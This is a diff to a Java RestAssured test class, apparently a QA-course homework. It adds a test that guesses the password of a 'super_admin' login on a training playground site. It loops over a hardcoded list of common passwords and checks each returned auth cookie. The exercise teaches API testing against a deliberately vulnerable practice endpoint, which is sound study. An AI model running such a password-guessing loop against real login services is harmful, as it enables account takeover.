@@ -3,6 +3,11 @@ import io.restassured.path.json.JsonPath;
 import io.restassured.response.Response;
 import org.junit.jupiter.api.Test;
 
+import java.util.Arrays;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
+
 import static org.junit.jupiter.api.Assertions.assertEquals;
 
 public class HelloWorldTest {
@@ -92,5 +97,112 @@ public class HelloWorldTest {
         assertEquals("Job is ready", afterReadyStatus, "Another value is expected");
         String result = afterReadyJson.getString("result");
         assertEquals("42", result, "Another value is expected");
+    }
+
+    @Test
+    public void Ex9() {
+
+        String login = "super_admin";
+        List<String> passwords = Arrays.asList(
+                "1234",
+                "12345",
+                "111111",
+                "121212",
+                "123123",
+                "123456",
+                "555555",
+                "654321",
+                "666666",
+                "696969",
+                "888888",
+                "1234567",
+                "7777777",
+                "12345678",
+                "123456789",
+                "1234567890",
+                "!@#$%^&*",
+                "000000",
+                "123qwe",
+                "1q2w3e4r",
+                "1qaz2wsx",
+                "aa123456",
+                "abc123",
+                "access",
+                "admin",
+                "adobe123",
+                "ashley",
+                "azerty",
+                "bailey",
+                "baseball",
+                "batman",
+                "charlie",
+                "donald",
+                "dragon",
+                "flower",
+                "Football",
+                "football",
+                "freedom",
+                "hello",
+                "hottie",
+                "iloveyou",
+                "jesus",
+                "letmein",
+                "login",
+                "lovely",
+                "loveme",
+                "master",
+                "michael",
+                "monkey",
+                "mustang",
+                "ninja",
+                "passw0rd",
+                "password",
+                "password1",
+                "photoshop",
+                "princess",
+                "qazwsx",
+                "qwerty",
+                "qwerty123",
+                "qwertyuiop",
+                "shadow",
+                "solo",
+                "starwars",
+                "sunshine",
+                "superman",
+                "trustno1",
+                "welcome",
+                "whatever",
+                "zaq1zaq1"
+        );
+
+        for (String password : passwords) {
+            Map<String, String> data = new HashMap<>();
+            data.put("login", login);
+            data.put("password", password);
+            Response response = RestAssured
+                    .given()
+                    .body(data)
+                    .when()
+                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                    .andReturn();
+            String auth_cookie = response.getCookie("auth_cookie");
+            Map<String, String> cookies = new HashMap<>();
+            if (auth_cookie != null) {
+                cookies.put("auth_cookie", auth_cookie);
+            }
+
+            Response checkResponse = RestAssured
+                    .given()
+                    .cookies(cookies)
+                    .when()
+                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
+                    .andReturn();
+            String result = checkResponse.getBody().asString();
+            System.out.println(password + " -> " +result);
+
+            if (result.equals("You are authorized")) {
+                break;
+            }
+        }
     }
 }
